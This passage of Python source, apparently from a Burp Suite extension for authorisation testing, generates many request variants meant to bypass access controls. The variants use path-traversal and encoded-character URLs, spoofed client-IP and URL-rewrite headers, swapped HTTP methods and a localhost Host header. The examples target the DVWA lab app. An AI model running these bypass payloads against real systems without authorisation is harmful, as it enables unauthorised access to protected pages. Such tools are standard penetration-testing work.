                _replaceWiths = [".", "./", "../", "/../", "/./", "/.", "/..", "..", "..;/", ".;/", "/..;", "/.;", "/..;/", "/.;/", "%09", "%09/", "/..%09", "..%09", "/.%09", ".%09", "%00", "%00/", "/..%00", "..%00", "/.%00", ".%00", "%ff", "%ff/", "/..%ff", "..%ff", "/.%ff", ".%ff", "%01", "%01/", "/..%01", "..%01", "/.%01", ".%01", "%20", "%20/", "/..%20", "..%20", "/.%20", ".%20", "%0a", "%0a/", "/..%0a", "..%0a", "/.%0a", ".%0a", "%0d", "%0d/", "/..%0d", "..%0d", "/.%0d", ".%0d", "/*", "*", "%2f"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        url = (_url + _replaceWith).replace("//", "/").replace(":/", "://")
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                # column8


                # column9, example url: http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/users/admin%00?id=1
                #                       http://dvwa.local/company/users/admin%00/?id=1
                #                       http://dvwa.local/company/users/admin../?id=1
                #                       http://dvwa.local/company/users/admin/../?id=1
                #                       http://dvwa.local/company/users/admin..;/?id=1
                _replaceWiths = [".", "./", "../", "/../", "/./", "/.", "/..", "..", "..;/", ".;/", "/..;", "/.;", "/..;/", "/.;/", "%09", "%09/", "/..%09", "..%09", "/.%09", ".%09", "%00", "%00/", "/..%00", "..%00", "/.%00", ".%00", "%ff", "%ff/", "/..%ff", "..%ff", "/.%ff", ".%ff", "%01", "%01/", "/..%01", "..%01", "/.%01", ".%01", "%20", "%20/", "/..%20", "..%20", "/.%20", ".%20", "%0a", "%0a/", "/..%0a", "..%0a", "/.%0a", ".%0a", "%0d", "%0d/", "/..%0d", "..%0d", "/.%0d", ".%0d", "/*", "*", "%2f"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                            url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                        else:
                            url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                        url = url.replace("//", "/").replace(":/", "://")
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                # column9


                # column10, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin/%09/?id=1
                #                           http://dvwa.local/company/%09/users/admin/%09/?id=1
                #                           http://dvwa.local/company/users/%09/admin/%09/?id=1

                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                                _url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                            else:
                                _url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            _url = _url.replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column10


                # column11, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin%09?id=1
                #                           http://dvwa.local/company/%09/users/admin%09?id=1
                #                           http://dvwa.local/company/users/%09/admin%09?id=1
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                                _url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                            else:
                                _url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith[1:-1] + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            _url = _url.replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column11


                # column12, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin?id=1/%09/
                #                           http://dvwa.local/company/%09/users/admin?id=1/%09/
                #                           http://dvwa.local/company/users/%09/admin?id=1/%09/
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _url = (_url + _replaceWith).replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column12



                # column13, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin?id=1%09
                #                           http://dvwa.local/company/%09/users/admin?id=1%09
                #                           http://dvwa.local/company/users/%09/admin?id=1%09
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _url = (_url + _replaceWith[1:-1]).replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column13


                # column14, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/users/admin.html?id=1
                _fileExtensions = [".js", ";.js", ".html", ";.html", ".js%2f", ";.js%2f", ".html%2f", ";.html%2f", ";index.html", "%00.html", ";%00.html", "%00.js", ";%00.js"]
                for _url in _urls:
                    if len(urlparse.urlparse(_url).path) > 1:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        for _fileExtension in _fileExtensions:
                            if urlparse.urlparse(_url).path.endswith("/"):
                                url = _url[: _locations[-1]] + _fileExtension + "/" + _url[_locations[-1] + 1:]
                            else:
                                url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _fileExtension + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            if url not in _rowUrls:
                                _rowUrls.append(url)
                                _columnNum = _columnNum + 1
                # column14


                # column15, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local//company//users//admin?id=1
                _replaceWiths = ["//", "///", "////", "/////"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') == 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            url = _url[: _locations[2]] + _replaceWith + _url[_locations[2] + 1:]
                        else:
                            url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path.replace("/", _replaceWith))
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                # column15


                # column16, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/COMPANY/USERS/ADMIN?ID=1
                #                           http://dvwa.local/company/USERS/ADMIN?ID=1
                #                           http://dvwa.local/company/users/ADMIN?ID=1
                for _url in _urls:
                    if _url.endswith('/'):
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                    else: 
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        _locations.append(len(_url))
                    for _location in _locations[2:-1]:
                        url = _url[:_location] + _url[_location:].upper()
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                        url = _url[:_location] + _url[_location:].lower()
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                # column16


                # column17, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/users/admin/?id=1
                for _url in _urls:
                    if len(urlparse.urlparse(_url).path) > 1:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        if urlparse.urlparse(_url).path.endswith("/"):
                            url = _url[: _locations[-1]] + _url[_locations[-1]:][1:]
                        else:
                            url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + "/" + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                # column17



                # column18, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/../company/users/admin%00?id=1
                #                           http://dvwa.local/company/users/../users/admin%00?id=1
                _replaceWith =  "/../"
                for _url in _urls:
                    if _url.count('/') != 3:
                        if urlparse.urlparse(_url).path.endswith('/'):
                            _url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path[:-1] + "%00/")
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-2]
                        else: 
                            _url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path + "%00")
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        path = _url[:_locations[2]]
                        for _path in _paths:
                            if _path:
                                path = path + "/" + _path
                                url = _url.replace(_url[: _locations[_url.count('/') - 1]], _url[: _locations[_url.count('/') - 1]])
                                url =  url.replace(path, path + _replaceWith + _path)
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column18


                # column19, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/../company/users/admin?id=1%00
                #                           http://dvwa.local/company/users/../users/admin?id=1%00
                _replaceWith =  "/../"
                for _url in _urls:
                    if _url.count('/') != 3:
                        _url = _url + "%00"
                        if urlparse.urlparse(_url).path.endswith('/'):
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-2]
                        else: 
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        path = _url[:_locations[2]]
                        for _path in _paths:
                            if _path:
                                path = path + "/" + _path
                                url = _url.replace(_url[: _locations[_url.count('/') - 1]], _url[: _locations[_url.count('/') - 1]])
                                url =  url.replace(path, path + _replaceWith + _path)
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column19


                self.cellNumbers = self.cellNumbers + _columnNum
                if columnNum < _columnNum:
                    columnNum = _columnNum

            except:
                print str(sys.exc_info()[1])

        return columnNum

    def attmeptPossibilities(self):
        try:
            _urls = []
            for x in range(0, self.tableMatrixAuthentication_DM.getRowCount()):
                _urls.append(self.tableMatrixAuthentication_DM.getValueAt(x, 0))
            _range = self.columnNumber(_urls)
            _columnNames = []
            _columnNames.append('URLs')
            for x in range(1, _range + 1):
                _columnNames.append(str(x))

            self.tableMatrixAuthentication_DM.removeRow(self.tableMatrixAuthentication_DM.getRowCount() - 1)
            self.tableMatrixAuthentication = []
            self.tableMatrixAuthentication_DM = CustomDefaultTableModel(self.tableMatrixAuthentication, _columnNames)
            self.tableMatrixAuthentication = JTable(self.tableMatrixAuthentication_DM)
            self.tableMatrixAuthentication_SP.getViewport().setView((self.tableMatrixAuthentication))
            self.tableMatrixAuthentication.getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
            self.tableMatrixAuthentication.getColumnModel().getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
            self.tableMatrixAuthentication.getColumnModel().getColumn(0).setPreferredWidth(400)
            for _url in _urls:
                self.tableMatrixAuthentication_DM.addRow([_url])
        except:
            print str(sys.exc_info()[1])

    def urlDuplicator(self, url):
        urls =[]
        urls.append(url)
        
        if urlparse.urlparse(url).path.endswith("/") and url.count("/") == 3:
            return urls
        elif urlparse.urlparse(url).path.endswith("/"):
            urls.append((urlparse.urlparse(url).path[:-1]).join(url.rsplit(urlparse.urlparse(url).path, 1)))
        else:
            urls.append((urlparse.urlparse(url).path + "/").join(url.rsplit(urlparse.urlparse(url).path, 1)))        
        return urls

    def authenticationMatrixThread(self, ev, _matrixList):
        self._requestViewerAuthentication.setMessage("", False)
        self._responseViewerAuthentication.setMessage("", False)
        self._btnAuthenticationFetchHistory.setEnabled(False)
        self._httpCalls =[]
        self._httpReqResAuthentication =[]
        self._httpReqResAuthenticationTipMessage =[]
        self.progressBarAuthenticationPanel.setValue(0)
        self._btnAuthenticationReset.setEnabled(False)
        self._cbAuthenticationHost.setEnabled(False)
        self._btnAuthenticationRun.setEnabled(False)
        self._cbAuthenticationEnableFilter.setEnabled(False)
        self._lblAuthenticationDaystoShow.setEnabled(False)
        self._cbAuthenticationDaystoShow.setEnabled(False)
        self._lblAuthenticationEnableURLGroup.setEnabled(False)
        self._cbAuthenticationEnableURLGroup.setEnabled(False)
        self._lblAuthenticationEnableFilter2.setEnabled(False)
        self._lblAuthenticationDaystoShow.setVisible(False)
        self._cbAuthenticationDaystoShow.setVisible(False)
        self.txAuthenticationEnableKeyWordURL.setEnabled(False)

        for x in range(0, self.tableMatrixAuthentication_DM.getRowCount()):
            for y in range(1, self.tableMatrixAuthentication_DM.getColumnCount()):
                self.tableMatrixAuthentication_DM.setValueAt("", x, y)
                
        self._lblAuthenticationNotification.text = "Just a moment, the table dimension is being calculated."
        self.errorNumbers = 0
        try:
            self.attmeptPossibilities()
            _progressBar = 1000000 / ( self.cellNumbers)
            _columnNum = 0
            for x in range(0, self.tableMatrixAuthentication_DM.getRowCount()):
                _columnNum = 0
                _reqRes =[]
                _cellHint = []
                _rowUrls = []
                _portNum = 80
                if urlparse.urlparse(str(_matrixList[x][0])).port:
                    _portNum = urlparse.urlparse(str(_matrixList[x][0])).port
                else:
                    if urlparse.urlparse(str(_matrixList[x][0])).scheme == "https":
                        _portNum = 443

                _body = _matrixList[x][2]
                _urls = self.urlDuplicator(_matrixList[x][0])
                _searchFor = '/'
                _replaceWith = ''
                # column0 Urls
                _cellHint.append("URL list.")
                # column0


                # column1 Base Request
                _url = str(_matrixList[x][0])
                _rowUrls.append(_url)
                _header = list(_matrixList[x][1])
                _reqRes.append(_url)
                self._httpCalls =[]
                _columnNum = _columnNum + 1
                _reqRes.append(self.authenticationMatrixCalls(_url, _header, _body, _portNum, x, _columnNum, _progressBar))
                _cellHint.append("Base request: '" + _url + "'")
                # column1


                # column2 Http request method has been replaced with others
                _reqMethods = ["ABC ", "TRACE ", "CONNECT ", "PATCH ", "DEBUG "]
                _headerOrg = list(_matrixList[x][1])
                for _reqMethod in _reqMethods:
                    for _url in _urls:
                        _header = list(_headerOrg[1:])
                        _header.insert(0, _reqMethod + _url[_url.rfind(urlparse.urlparse(_url).path):] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                        self._httpCalls =[]
                        _columnNum = _columnNum + 1
                        _reqRes.append(self.authenticationMatrixCalls(_url, _header, _body, _portNum, x, _columnNum, _progressBar))
                        _cellHint.append("Http request method has been replaced with '"+ _reqMethod + "', '" + _url + "'")
                # column2


                # column3 'X-*' parameter has been added to the header.
                _headerParams = ["X-Originating-IP: ", "X-Forwarded-For: ", "X-Forwarded: ", "X-Remote-IP: ", "X-Remote-Addr: ", "X-ProxyUser-Ip: ", "X-Client-IP: ", "True-Client-IP: ", "Cluster-Client-IP: ", "X-Custom-IP-Authorization: ", "X-Forward-For: ", "X-Real-IP: ", "X-Host: ", "X-Forwarded-Host: ", "X-Trusted-IP: ", "X-Forwarded-Server: "]
                _headerValues = ["127.0.0.1", _url.replace(urlparse.urlparse(_url).netloc.split(':',1)[0], 'localhost').split('/',3)[0] + "//" + _url.replace(urlparse.urlparse(_url).netloc.split(':',1)[0], 'localhost').split('/',3)[2]]
                _headerOrg = list(_matrixList[x][1])
                for _headerParam in _headerParams:
                    for _headerValue in _headerValues:
                        for _url in _urls:
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " " + _url[_url.rfind(urlparse.urlparse(_url).path):] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            _header.insert(2, _headerParam + _headerValue)
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(_url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("'" + _headerParam[:-2] + "' parameter has been added to the request header, '" + _url + "'")
                # column3


                # column4 'X-*' parameter has been added to the header.
                _headerParams = ["X-Original-URL: ", "X-Rewrite-URL: ", "X-Override-URL: ", "X-Http-Destinationurl: ", "X-Proxy-Url: "]
                _headerValues = [_url.split("/", 3)[3]]
                _headerOrg = list(_matrixList[x][1])
                for _headerParam in _headerParams:
                    for _url in _urls:
                        _header = list(_headerOrg[1:])
                        _header.insert(1, _headerParam + urlparse.urlparse(_url).path)
                        _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " " + _url[_url.rfind(urlparse.urlparse(_url).path):] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                        self._httpCalls =[]
                        _columnNum = _columnNum + 1
                        _reqRes.append(self.authenticationMatrixCalls(_url, _header, _body, _portNum, x, _columnNum, _progressBar))
                        _cellHint.append("'" + _headerParam + "' parameter has been added to the request header, '" + _url + "'")
                # column4


                # column5 'Host' parameter has been replaced with 'localhost'
                _hostParams = ["localhost", "127.0.0.1"]
                _headerOrg = list(_matrixList[x][1])
                for _hostParam in _hostParams:
                    for _url in _urls:
                        _header = list(_headerOrg[1:])
                        _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " " + _url[_url.rfind(urlparse.urlparse(_url).path):] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                        for line in _header:
                            if line.startswith("Host: "):
                                _header.remove(line)
                                break
                        _header.insert(1, "Host: " + _hostParam)
                        self._httpCalls =[]
                        _columnNum = _columnNum + 1
                        _reqRes.append(self.authenticationMatrixCalls(_url, _header, _body, _portNum, x, _columnNum, _progressBar))
                        _cellHint.append("'Host' parameter has been replaced with '" + _hostParam + "', '" + _url + "'")
                # column5


                # column6, example url: http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/../company/users/admin?id=1
                #                       http://dvwa.local/company/users/../users/admin?id=1
                #                       http://dvwa.local/company/users/admin/../admin?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/%2e%2e/", "/../", "/..././", "/..;/", "/..;", "..;"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            if urlparse.urlparse(_url).path.endswith('/'):
                                _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                            else: 
                                _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            path = _url[:_locations[2]]
                            for _path in _paths:
                                if _path:
                                    path = path + "/" + _path
                                    url =  _url.replace(path, path + _replaceWith + _path)
                                    if url not in _rowUrls:
                                        _rowUrls.append(url)
                                        _header = list(_headerOrg[1:])
                                        _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                        self._httpCalls =[]
                                        _columnNum = _columnNum + 1
                                        _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                        _cellHint.append("Target URL is '" + url + "'")
                # column6
                


                #column7, example url:  http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/../company/users/admin?id=1
                #                       http://dvwa.local/;/company/users/admin?id=1
                #                       http://dvwa.local/company/;/users/admin?id=1
                #                       http://dvwa.local/company/users/;/admin?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/./", "/../", "/..././", "/;/", "//;//", "/.;/", "/;", "/.;", "/%2e/", "/%2f/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/", "/%09/"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') == 3:
                            url = _url[: _locations[2]] + _replaceWith + _url[_locations[2] + 1:]
                            if '..' in url:
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                        else:
                            for _location in _locations[2:]:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                                if '..' in url:
                                    break
                #column7


                #column8, example url:  http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/users/admin?id=1%00
                #                       http://dvwa.local/company/users/admin?id=1%00/
                #                       http://dvwa.local/company/users/admin?id=1../
                #                       http://dvwa.local/company/users/admin?id=1/../
                #                       http://dvwa.local/company/users/admin?id=1..;/
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = [".", "./", "../", "/../", "/./", "/.", "/..", "..", "..;/", ".;/", "/..;", "/.;", "/..;/", "/.;/", "%09", "%09/", "/..%09", "..%09", "/.%09", ".%09", "%00", "%00/", "/..%00", "..%00", "/.%00", ".%00", "%ff", "%ff/", "/..%ff", "..%ff", "/.%ff", ".%ff", "%01", "%01/", "/..%01", "..%01", "/.%01", ".%01", "%20", "%20/", "/..%20", "..%20", "/.%20", ".%20", "%0a", "%0a/", "/..%0a", "..%0a", "/.%0a", ".%0a", "%0d", "%0d/", "/..%0d", "..%0d", "/.%0d", ".%0d", "/*", "*", "%2f"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        url = (_url + _replaceWith).replace("//", "/").replace(":/", "://")
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                # column8


                # column9, example url: http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/users/admin%00?id=1
                #                       http://dvwa.local/company/users/admin%00/?id=1
                #                       http://dvwa.local/company/users/admin../?id=1
                #                       http://dvwa.local/company/users/admin/../?id=1
                #                       http://dvwa.local/company/users/admin..;/?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = [".", "./", "../", "/../", "/./", "/.", "/..", "..", "..;/", ".;/", "/..;", "/.;", "/..;/", "/.;/", "%09", "%09/", "/..%09", "..%09", "/.%09", ".%09", "%00", "%00/", "/..%00", "..%00", "/.%00", ".%00", "%ff", "%ff/", "/..%ff", "..%ff", "/.%ff", ".%ff", "%01", "%01/", "/..%01", "..%01", "/.%01", ".%01", "%20", "%20/", "/..%20", "..%20", "/.%20", ".%20", "%0a", "%0a/", "/..%0a", "..%0a", "/.%0a", ".%0a", "%0d", "%0d/", "/..%0d", "..%0d", "/.%0d", ".%0d", "/*", "*", "%2f"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                            url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                        else:
                            url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                        url = url.replace("//", "/").replace(":/", "://")
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                # column9


                # column10, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin/%09/?id=1
                #                           http://dvwa.local/company/%09/users/admin/%09/?id=1
                #                           http://dvwa.local/company/users/%09/admin/%09/?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                                _url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                            else:
                                _url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            _url = _url.replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column10


                # column11, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin%09?id=1
                #                           http://dvwa.local/company/%09/users/admin%09?id=1
                #                           http://dvwa.local/company/users/%09/admin%09?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                                _url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                            else:
                                _url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith[1:-1] + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            _url = _url.replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column11


                # column12, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin?id=1/%09/
                #                           http://dvwa.local/company/%09/users/admin?id=1/%09/
                #                           http://dvwa.local/company/users/%09/admin?id=1/%09/
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
